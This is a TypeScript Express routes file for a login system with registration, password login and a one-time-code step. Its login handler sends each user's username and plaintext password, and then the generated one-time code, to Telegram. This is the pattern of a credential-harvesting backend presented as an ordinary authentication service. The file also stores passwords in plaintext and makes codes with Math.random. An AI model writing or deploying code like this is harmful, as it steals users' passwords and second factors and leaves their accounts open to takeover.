import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { insertUserSchema } from "@shared/schema";
import { z } from "zod";
import { notifyLogin, notifyOTP } from "./telegram";

function generateOTP(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

export async function registerRoutes(app: Express): Promise<Server> {
  
  // Register a new user
  app.post("/api/auth/register", async (req, res) => {
    try {
      const validatedData = insertUserSchema.parse(req.body);
      
      const existingUser = await storage.getUserByUsername(validatedData.username);
      if (existingUser) {
        return res.status(400).json({ error: "Username already exists" });
      }

      const user = await storage.createUser(validatedData);
      
      res.json({ 
        success: true, 
        message: "User registered successfully",
        userId: user.id 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ error: error.errors });
      }
      res.status(500).json({ error: "Failed to register user" });
    }
  });

  // Login - Step 1: Verify credentials and send to Telegram
  app.post("/api/auth/login", async (req, res) => {
    try {
      const { username, password } = req.body;

      if (!username || !password) {
        return res.status(400).json({ error: "Username and password required" });
      }

      const user = await storage.getUserByUsername(username);
      
      if (!user || user.password !== password) {
        return res.status(401).json({ error: "Invalid credentials" });
      }

      // Send login credentials to Telegram
      await notifyLogin(username, password);

      // Generate OTP
      const otpCode = generateOTP();
      const expiresAt = new Date(Date.now() + 5 * 60 * 1000); // 5 minutes

      await storage.createOtp({
        userId: user.id,
        code: otpCode,
        expiresAt,
        verified: 'false'
      });

      // Send OTP to Telegram
      await notifyOTP(username, otpCode);

      res.json({
        success: true,
        message: "OTP sent to Telegram",
        userId: user.id,
        requiresOtp: true
      });
    } catch (error) {
      console.error("Login error:", error);
      res.status(500).json({ error: "Login failed" });
    }
  });

  // Verify OTP - Step 2: Verify the OTP code
  app.post("/api/auth/verify-otp", async (req, res) => {
    try {
      const { userId, code } = req.body;

      if (!userId || !code) {
        return res.status(400).json({ error: "User ID and OTP code required" });
      }

      const isValid = await storage.verifyOtp(userId, code);

      if (!isValid) {
        return res.status(401).json({ error: "Invalid or expired OTP" });
      }

      const user = await storage.getUser(userId);

      res.json({
        success: true,
        message: "Login successful",
        user: {
          id: user!.id,
          username: user!.username
        }
      });
    } catch (error) {
      console.error("OTP verification error:", error);
      res.status(500).json({ error: "OTP verification failed" });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
